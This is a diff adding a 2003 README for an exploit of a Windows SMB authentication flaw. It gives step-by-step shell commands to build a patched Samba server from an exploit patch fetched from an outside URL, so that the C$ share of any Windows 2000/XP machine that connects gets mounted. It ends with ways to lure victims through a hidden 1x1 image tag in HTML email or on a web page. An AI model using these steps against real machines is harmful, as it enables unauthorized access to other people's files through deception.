@@ -1,0 +1,79 @@
+################################################################################
+# Exploit for "Authentication flaw in Windows SMB protocol"                    #
+################################################################################
+# Release Date:                                                                #
+#   April 24, 2003                                                             #
+#                                                                              #
+# Code by Haamed Gheibi (haamed@linux.ce.aut.ac.ir)                            #
+#         Salman Niksefat (salman@linux.ce.aut.ac.ir)                          #
+#                                                                              #
+# Systems Affected by this exploit:                                            #
+#   Windows 2000 (SP0 SP1 SP2 SP3)                                             #
+#   Windows XP (SP0 SP1)                                                       #
+#                                                                              #
+# THIS EXPLOIT IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY AS A PROOF OF CONCEPT #
+# WE TAKE NO RESPONSIBILITY FOR USE OF THIS CODE.                              #
+################################################################################
+
+This exploit is based on samba-2.2.8a, you can download the source code from:
+ http://us1.samba.org/samba/ftp/samba-2.2.8a.tar.bz2
+or other mirrors.
+
+First you should configure and make samba source code as follow:
+You need first to extract the file:
+ $ tar -jxf samba-2.2.8a.tar.bz2
+ $ cd samba-2.2.8a/source
+
+Here you need to configure with suitable options. Here is a config for RedHat 9:
+ $ ./configure --sysconfdir=/etc --with-codepagedir=/usr/share/samba/codepages\
+  --with-lockdir=/var/cache/samba --with-configdir=/etc/samba
+
+ $ make
+ $ make bin/smbmount
+ $ su
+ # make install
+
+First add an arbitary user to samba: (Choose a reliable password for it for your protection!)
+ # smbadduser smbtmpuser:root
+
+Now check if your samba server(bin/smbd) and client(bin/smbmount) are working, 
+and that ipchains rulls are not set. you can use:
+ # service smbd stop
+ # bin/smbd -i
+ # ipchains -F
+
+Well, now if everything works fine, you can apply the exploit code to the source.
+Download it from: http://seclab.ce.aut.ac.ir/samba-exp/exploit/backrush.patch
+ # patch &lt; backrush.patch
+
+Make it again:
+ # make bin/smbd
+ # make bin/smbmount
+[Note that you shouldn't make whole samba, cause you may get linker errors]
+
+Make necessary directories:
+ # mkdir -p bin/backrush/log
+ # mkdir bin/backrush/mnt
+ # touch bin/backrush/ip2sharename.map
+
+Now we are done, you MUST change directory to bin and run the server:
+ # cd bin
+ # killall -9 smbd
+ # ./smbd
+ 
+Now by default, the C$ share folder of any Windows machine who tries to connect
+to this SMB server, would be mounted to mnt/machinename-random folder.
+If you want to mount another share folder, you can add an entry to ip2sharename.map file as follow:
+IPADDRESS:SHARENAME
+This option is suitable for XP systems.
+
+2 ways 2 force a client to automatically connect to your modified SMB server:
+  1. Send him/her a HTML email with the following tag:
+    &lt;IMG src='\\smb-server\nofile.gif' width=1 height=1&gt;
+
+  2. Invite him/her to visit your personal web page.
+     You can make it by the above tag, then pray and wait until he/she visits your page. ;)
+
+Enjoy!
+
+
